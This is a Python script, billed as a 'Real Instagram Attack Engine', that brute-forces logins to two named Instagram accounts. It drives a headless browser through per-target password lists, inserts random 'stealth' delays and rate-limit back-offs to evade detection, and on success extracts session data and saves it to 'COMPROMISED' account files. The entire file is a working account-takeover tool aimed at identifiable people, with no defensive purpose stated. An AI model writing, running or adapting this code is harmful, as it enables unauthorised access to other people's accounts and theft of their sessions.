#!/usr/bin/env python3
"""
🔥 REAL INSTAGRAM ATTACK ENGINE 🔥
Using REAL targets and passwords - NO MOCK DATA!

Real Targets:
- alx.trading
- whatilove1728

Real Attack Strategy:
- Direct connection (no proxy initially)
- Real password lists for each target
- Maximum stealth and power
"""

import os
import sys
import json
import time
import random
import logging
from datetime import datetime
from typing import Dict, List, Optional

# Add modules path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

from ultimate_browser_manager import UltimateBrowserManager

class RealInstagramAttacker:
    """🔥 Real Instagram Attack Engine - NO FAKE DATA"""
    
    def __init__(self):
        self.results = {
            'successful_attacks': [],
            'failed_attempts': [],
            'statistics': {
                'total_attempts': 0,
                'successful_logins': 0,
                'failed_logins': 0,
                'start_time': datetime.now().isoformat()
            }
        }
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f"logs/real_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Ensure directories exist
        os.makedirs('logs', exist_ok=True)
        os.makedirs('output', exist_ok=True)
    
    def load_real_targets(self) -> List[str]:
        """Load real targets from targets.txt"""
        try:
            with open('targets.txt', 'r') as f:
                targets = [line.strip() for line in f.readlines() if line.strip()]
            
            self.logger.info(f"🎯 Loaded {len(targets)} REAL targets: {targets}")
            return targets
            
        except FileNotFoundError:
            self.logger.error("❌ targets.txt not found!")
            return []
    
    def load_passwords_for_target(self, target: str) -> List[str]:
        """Load specific password list for each target"""
        password_files = {
            'alx.trading': 'alx_trading_passwords.txt',
            'whatilove1728': 'whatilove1728.txt'
        }
        
        password_file = password_files.get(target, 'common_passwords.txt')
        
        try:
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
            
            self.logger.info(f"🔑 Loaded {len(passwords)} REAL passwords for {target} from {password_file}")
            return passwords
            
        except FileNotFoundError:
            self.logger.error(f"❌ Password file {password_file} not found!")
            return []
    
    def attempt_real_login(self, username: str, password: str) -> Dict:
        """Real login attempt - NO MOCK"""
        attempt_result = {
            'username': username,
            'password': password,
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'error': None,
            'session_data': None
        }
        
        browser_manager = None
        
        try:
            self.logger.info(f"🔥 REAL ATTACK: {username} : {password}")
            
            # Create browser manager WITHOUT proxy for stealth
            browser_manager = UltimateBrowserManager(proxy_config=None, debug=False)
            
            # Setup virtual display
            if not browser_manager.setup_virtual_display():
                raise Exception("Failed to setup virtual display")
            
            # Create browser session
            browser = browser_manager.create_browser_session()
            if not browser:
                raise Exception("Failed to create browser session")
            
            # Navigate to Instagram login
            self.logger.info("📱 Navigating to Instagram...")
            if not browser_manager.navigate_to_instagram():
                raise Exception("Failed to navigate to Instagram")
            
            # Wait for page to fully load
            time.sleep(random.uniform(3, 5))
            
            # Perform real login attempt
            self.logger.info(f"🔑 Attempting login for {username}...")
            login_success = browser_manager.perform_login(username, password)
            
            if login_success:
                self.logger.info(f"✅ Login SUCCESS for {username}!")
                
                # Wait for post-login processing
                time.sleep(random.uniform(5, 8))
                
                # Extract session data immediately
                session_data = browser_manager.extract_session_data()
                
                if session_data and session_data.get('success'):
                    attempt_result['success'] = True
                    attempt_result['session_data'] = session_data
                    
                    # Save immediately
                    self._save_successful_attack(username, password, session_data)
                    
                    self.logger.info(f"🎉 ACCOUNT COMPROMISED: {username}")
                    
                else:
                    attempt_result['error'] = "Login successful but session extraction failed"
                    self.logger.warning(f"⚠️ Login success but no session data for {username}")
                    
            else:
                attempt_result['error'] = "Login failed - invalid credentials"
                self.logger.info(f"❌ Login failed for {username}:{password}")
            
        except Exception as e:
            attempt_result['error'] = str(e)
            self.logger.error(f"💥 Attack error: {e}")
            
        finally:
            # Cleanup
            if browser_manager:
                browser_manager.cleanup()
            
            # Update statistics
            self.results['statistics']['total_attempts'] += 1
            if attempt_result['success']:
                self.results['statistics']['successful_logins'] += 1
                self.results['successful_attacks'].append(attempt_result)
            else:
                self.results['statistics']['failed_logins'] += 1
                self.results['failed_attempts'].append(attempt_result)
        
        return attempt_result
    
    def _save_successful_attack(self, username: str, password: str, session_data: Dict):
        """Save successful attack immediately"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"output/COMPROMISED_{username}_{timestamp}.json"
            
            attack_info = {
                'target': username,
                'password': password,
                'compromised_at': timestamp,
                'session_data': session_data,
                'attack_method': 'Real Instagram Attack Engine',
                'success': True
            }
            
            with open(filename, 'w') as f:
                json.dump(attack_info, f, indent=2)
            
            self.logger.info(f"💾 Compromised account saved to {filename}")
            
            # Also save to a master file
            master_file = "output/MASTER_COMPROMISED_ACCOUNTS.json"
            
            try:
                with open(master_file, 'r') as f:
                    master_data = json.load(f)
            except:
                master_data = {'compromised_accounts': []}
            
            master_data['compromised_accounts'].append(attack_info)
            
            with open(master_file, 'w') as f:
                json.dump(master_data, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Failed to save attack: {e}")
    
    def attack_target(self, target: str) -> Dict:
        """Attack a single real target"""
        self.logger.info(f"🎯 ATTACKING TARGET: {target}")
        
        # Load specific passwords for this target
        passwords = self.load_passwords_for_target(target)
        
        if not passwords:
            self.logger.error(f"No passwords for target {target}")
            return {'error': 'No passwords loaded'}
        
        target_results = {
            'target': target,
            'total_passwords_tried': 0,
            'successful_attack': None,
            'failed_attempts': [],
            'start_time': datetime.now().isoformat()
        }
        
        # Try each password
        for i, password in enumerate(passwords):
            self.logger.info(f"📊 Progress: {i+1}/{len(passwords)} passwords for {target}")
            
            # Add delay between attempts for stealth
            if i > 0:
                delay = random.uniform(10, 20)  # Longer delays for stealth
                self.logger.info(f"⏱️ Stealth delay: {delay:.1f}s")
                time.sleep(delay)
            
            # Attempt login
            result = self.attempt_real_login(target, password)
            target_results['total_passwords_tried'] += 1
            
            if result['success']:
                target_results['successful_attack'] = result
                self.logger.info(f"🔥🔥🔥 TARGET {target} COMPROMISED! 🔥🔥🔥")
                break
            else:
                target_results['failed_attempts'].append(result)
                
                # Check for Instagram security measures
                if result.get('error'):
                    error_msg = result['error'].lower()
                    if 'suspicious' in error_msg or 'blocked' in error_msg:
                        self.logger.warning(f"⚠️ Account may be blocked, continuing...")
                    elif 'rate limit' in error_msg:
                        self.logger.warning(f"⚠️ Rate limited, adding extra delay...")
                        time.sleep(random.uniform(30, 60))
        
        target_results['end_time'] = datetime.now().isoformat()
        return target_results
    
    def run_real_attack(self) -> Dict:
        """Run the real attack on all targets"""
        self.logger.info("🔥🔥🔥 STARTING REAL INSTAGRAM ATTACK 🔥🔥🔥")
        self.logger.info("🎯 Using REAL targets and REAL passwords!")
        
        # Load real targets
        targets = self.load_real_targets()
        
        if not targets:
            self.logger.error("No real targets loaded!")
            return self.results
        
        self.logger.info(f"🎯 Attacking {len(targets)} real targets: {targets}")
        
        # Attack each target
        for target in targets:
            self.logger.info(f"\n{'='*60}")
            self.logger.info(f"🎯 ATTACKING: {target}")
            self.logger.info('='*60)
            
            result = self.attack_target(target)
            
            if result.get('successful_attack'):
                self.logger.info(f"🎉 {target} COMPROMISED!")
            else:
                self.logger.info(f"❌ {target} attack failed")
        
        # Finalize results
        self.results['statistics']['end_time'] = datetime.now().isoformat()
        
        # Save final results
        self._save_final_results()
        
        return self.results
    
    def _save_final_results(self):
        """Save final attack results"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"output/REAL_ATTACK_RESULTS_{timestamp}.json"
            
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            
            # Print final summary
            stats = self.results['statistics']
            self.logger.info("\n" + "🔥" * 60)
            self.logger.info("🔥 REAL ATTACK COMPLETE 🔥")
            self.logger.info("🔥" * 60)
            self.logger.info(f"📊 Total attempts: {stats['total_attempts']}")
            self.logger.info(f"✅ Successful logins: {stats['successful_logins']}")
            self.logger.info(f"❌ Failed logins: {stats['failed_logins']}")
            
            if stats['successful_logins'] > 0:
                self.logger.info(f"🎉 {stats['successful_logins']} REAL ACCOUNTS COMPROMISED!")
            else:
                self.logger.info("❌ No accounts compromised in this attack")
            
            self.logger.info(f"💾 Results saved to {filename}")
            
        except Exception as e:
            self.logger.error(f"Failed to save final results: {e}")

def main():
    """Main entry point for real attack"""
    print("🔥" * 60)
    print("🔥 REAL INSTAGRAM ATTACK ENGINE v1.0 🔥")
    print("🔥 NO MOCK DATA - REAL TARGETS ONLY! 🔥")
    print("🔥" * 60)
    print()
    
    try:
        # Create real attacker
        attacker = RealInstagramAttacker()
        
        # Confirm attack
        print("⚠️ WARNING: This will attack REAL Instagram accounts!")
        print("🎯 Targets: alx.trading, whatilove1728")
        print("🔑 Using real password lists")
        print()
        
        confirm = input("🔥 Continue with REAL attack? (yes/NO): ").strip().lower()
        
        if confirm == 'yes':
            print("\n🔥 LAUNCHING REAL ATTACK!")
            results = attacker.run_real_attack()
            return results
        else:
            print("❌ Attack cancelled by user")
            return None
        
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        return None
    except Exception as e:
        print(f"💥 Critical error: {e}")
        return None

if __name__ == "__main__":
    main()
